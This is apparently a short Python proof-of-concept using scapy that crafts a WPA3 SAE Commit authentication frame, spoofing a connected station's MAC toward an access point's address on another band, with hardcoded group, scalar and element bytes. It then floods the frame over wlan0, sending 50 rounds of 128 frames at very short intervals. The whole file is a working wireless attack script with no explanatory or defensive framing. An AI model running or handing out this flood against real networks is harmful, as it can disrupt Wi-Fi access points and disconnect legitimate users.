from scapy.all import *
       
#SAE Commit frame from different channel
def auth_frame():
    client = 'STA MAC' #connected STA
    bssid = 'AP MAC' #AP MAC from other band

    return RadioTap()\
      /Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)
      
group = '\x13\x00'
scalar = '\xfe\xa0\x7e\xb5\x65\xb4\x00\x57\x88\x22\x6c\x97\x21\x6b\x7c\x34\x7f\xc1\xf0\xfd\x34\xc1\x74\x2b\x6e\xc4\xe2\x91\x98\x11\xc8\xf8'
finite = '\x69\x42\x1d\x7a\xfc\x4a\x65\x22\x20\x40\xd6\x72\x42\x8e\x4b\x70\xeb\x70\xdf\x94\x5b\xa6\x6b\xb4\x69\xa9\x1c\x6c\x2f\x7e\xca\x1b\xb5\x2f\xb8\x49\x73\xd7\x37\x35\x3a\xb4\xcb\x17\x72\xa0\x6a\x34\x1c\x7c\xbc\xbf\x40\xd8\x76\xc2\xd2\x09\x1b\xcb\xa3\x9f\x59\x1e'

def construct_commit():
    Auth = auth_frame()

    return Auth/group/scalar/finite
    

for n in range(int(50)):
	sendp(construct_commit(), inter=0.0001, count=128, iface='wlan0')
	print ('\nSAE Commit frame send: ' + str(n))
  